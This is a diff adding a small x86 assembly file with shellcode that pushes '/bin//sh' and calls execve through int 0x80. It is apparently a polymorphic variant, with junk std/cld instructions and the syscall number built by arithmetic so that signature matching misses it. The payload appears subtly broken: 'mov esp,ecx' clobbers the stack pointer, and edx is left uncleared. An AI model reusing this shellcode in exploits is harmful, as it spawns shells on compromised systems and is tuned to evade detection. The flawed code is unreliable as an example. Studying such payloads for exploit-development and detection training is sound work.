@@ -1,0 +1,28 @@
+
+global _start
+section .text
+_start:
+
+std ; junk instruction
+
+xor    eax,eax
+push   eax
+
+push   0x68732f2f
+push   0x6e69622f
+
+mov    ebx,esp
+push   eax
+push   ebx
+mov    esp,ecx
+
+; cltd <- removing this useless instruction
+
+; mov al,0xb <- 11 is moved to eax
+mov    al,0x8   ; 8 is moved to eax
+add al,0x2 ; 2 is added to eax
+inc eax  ; eax is incremented by 1
+
+int    0x80
+
+cld ; junk instruction
